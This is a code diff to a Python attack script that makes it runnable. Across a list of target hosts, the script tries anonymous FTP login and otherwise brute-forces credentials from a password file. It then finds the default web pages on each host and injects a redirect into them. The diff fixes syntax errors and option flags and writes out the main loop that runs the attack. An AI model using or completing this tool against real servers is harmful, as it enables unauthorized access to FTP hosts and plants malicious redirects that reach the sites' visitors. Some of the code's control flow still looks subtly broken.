@@ -24,28 +24,32 @@ def bruteLogin(hostname, passwdFile):
     print('[+] Trying:' + userName +"/" + passWord)
 
     try:
-            ftp = ftplib.FTP(hostname)
-            ftp.login(userName, passWord)
-            print('\n[*]' + str(hostname) +\
-                "FTP login Succeeded: " + userName+ '/' + passWord)
-            
-            ftp.quit()
+        ftp = ftplib.FTP(hostname)
+        ftp.login(userName, passWord)
+        print('\n[*]' + str(hostname) +\
+            "FTP login Succeeded: " + userName+ '/' + passWord)
+        
+        ftp.quit()
 
-            return(userName, passWord)
-        except Exception as e:
-            pass
+        return(userName, passWord)
+    except Exception as e:
+        pass
 
         print('\n[-]Could not brute force FTP credentials')
         return(None, None)
 
 def returnDefault(ftp):
-    try;
+    try:
         dirList = ftp.nlst()
+    
+    except:
+        dirList=[]
         print('[-] Could not list directory contents')
         print('[-] Skipping to Next target')
         return
+
     retList = []
-    
+
     for fileName in dirList:
         fn = fileName.lower()
 
@@ -70,7 +74,7 @@ def injectPage(ftp,page,redirect):
 def attack(username, password, tgtHost, redirect):
     ftp = ftplib.FTP(tgtHost)
 
-    ftp.login(unsername, password)
+    ftp.login(username, password)
 
     defPages = returnDefault(ftp)
 
@@ -82,23 +86,44 @@ def main():
         '-H <target host[s]> -r <redirect page>' +\
             '[-f <userpass file]')
     
-    parser.add_option('-H', dest='tgtHost',\ 
+    parser.add_option('-H', dest='tgtHosts',
         type='string', help='specify target host')
     
-    parser.add_option('-H', dest='passwdFile',\ 
+    parser.add_option('-f', dest='passwdFile',
         type='string', help='specify user/password file')
     
-    parser.add_option('-H', dest='redirect',\ 
+    parser.add_option('-r', dest='redirect',
         type='string', help='specify a redirection page')
     
-        (options, args) = parser.parse_args()
+    (options, args) = parser.parse_args()
     
-    tgtHost = str(options.tgtHost).split(',')
+    tgtHosts = str(options.tgtHosts).split(',')
     passwdFile = options.passwdFile
     redirect = options.redirect
 
-    
+    if tgtHosts == None or redirect == None:
+        print(parser.usage)
+        exit(0)
 
+    for tgtHost in tgtHosts:
+        username = None
+        password = None
 
-host = '10.0.2.13'
-anonLogin(host)
+        if anonLogin(tgtHost) == True:
+            username = 'anonymous'
+            password = 'anonymous'
+
+            print('[+] Using Anonymous Creds to attack')
+
+            attack(username, password, tgtHost, redirect)
+        elif passwdFile != None:
+            (username, password) = \
+                bruteLogin(tgtHost, passwdFile)
+        
+        if password != None:
+            print('[+] Using Creds:' + username + '/' + password + ' to attack')
+            attack(username, password, tgtHost, redirect)
+
+if __name__ =='__main__':
+    main()
+           
